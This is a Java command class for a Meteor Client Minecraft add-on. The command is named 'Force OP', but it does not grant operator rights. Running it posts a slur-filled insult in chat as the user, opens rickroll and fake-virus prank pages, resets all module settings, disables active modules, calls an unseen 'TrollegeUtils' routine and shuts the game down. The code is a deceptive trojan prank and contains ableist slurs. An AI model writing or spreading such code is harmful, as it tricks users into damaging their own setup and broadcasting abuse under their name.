package communityaddon.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import communityaddon.Addon;
import communityaddon.TrollegeUtils;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.systems.commands.Command;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.Modules;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.command.CommandSource;
import net.minecraft.util.Util;

import java.util.ArrayList;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;

public class CommandExample extends Command {
    public CommandExample() {
        super("Force OP", "sex.");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(context -> {
            ChatUtils.sendPlayerMsg("I USE WURST LIKE A FUCKING RETARD AND SUCK AT CPVP IM A E-GIRL UWUWUWUWUUWUW");
            Util.getOperatingSystem().open("https://www.youtube.com/watch?v=vtNJMAyeP0s");
            Util.getOperatingSystem().open("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
            Util.getOperatingSystem().open("https://pranx.com/fake-virus/");
            System.out.println("This guys a fucking retard");
            Modules.get().getAll().forEach(module -> module.settings.forEach(group -> group.forEach(Setting::reset)));
            new ArrayList<>(Modules.get().getActive()).forEach(Module::toggle);
            TrollegeUtils.severelackoffriends();
            mc.close();
            mc.stop();
            return SINGLE_SUCCESS;
        });
    }
}
